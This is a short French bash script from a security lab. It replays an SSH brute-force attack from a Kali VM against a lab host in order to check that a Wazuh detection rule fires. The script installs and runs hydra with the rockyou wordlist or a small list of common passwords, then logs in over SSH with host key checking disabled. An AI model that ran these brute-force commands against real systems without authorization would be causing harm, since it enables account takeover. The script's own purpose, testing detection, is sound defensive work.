#!/usr/bin/env bash
# ============================================================
#  01-bruteforce-ssh.sh
#  Rejoue le scénario D1 : brute-force SSH suivi d'un succès.
#  À exécuter depuis la VM kali (10.10.10.99).
# ============================================================
set -euo pipefail

TARGET="${TARGET:-10.10.10.10}"
USER="${USER_TO_TRY:-debian}"
WORDLIST="/usr/share/wordlists/rockyou-25.txt"

echo "==> [D1] Brute-force SSH contre ${TARGET} (utilisateur ${USER})"
echo "    Cette attaque DOIT déclencher la règle Wazuh ID 100200 (level 12)."
echo

# 1. Phase 1 : tentatives échouées avec mauvais mots de passe
if ! command -v hydra >/dev/null; then
  echo "    Hydra absent. Installation..."
  sudo apt-get update -qq && sudo apt-get install -y hydra
fi

if [ ! -f "$WORDLIST" ]; then
  WORDLIST="/usr/share/wordlists/rockyou.txt.gz"
  if [ -f "$WORDLIST" ]; then
    sudo gunzip -k "$WORDLIST"
    WORDLIST="/usr/share/wordlists/rockyou.txt"
  else
    echo "    Wordlist absente, création d'une mini-liste pour le lab..."
    cat > /tmp/lab-wordlist.txt <<EOF
123456
password
admin
toto
qwerty
azerty
welcome
EOF
    WORDLIST=/tmp/lab-wordlist.txt
  fi
fi

echo "==> Phase 1 : 5+ échecs successifs..."
hydra -l "$USER" -P "$WORDLIST" -t 1 -f -V "${TARGET}" ssh || true

# 2. Phase 2 : connexion légitime simulée (avec la bonne clé SSH déjà déposée)
echo
echo "==> Phase 2 : connexion légitime depuis la même IP..."
ssh -o StrictHostKeyChecking=no "${USER}@${TARGET}" "echo 'login OK $(date)'" || true

echo
echo "==> Vérifier le déclenchement dans Wazuh :"
echo "    https://wazuh.lab.tutotech.org/  →  Discover  →  rule.id : 100200"
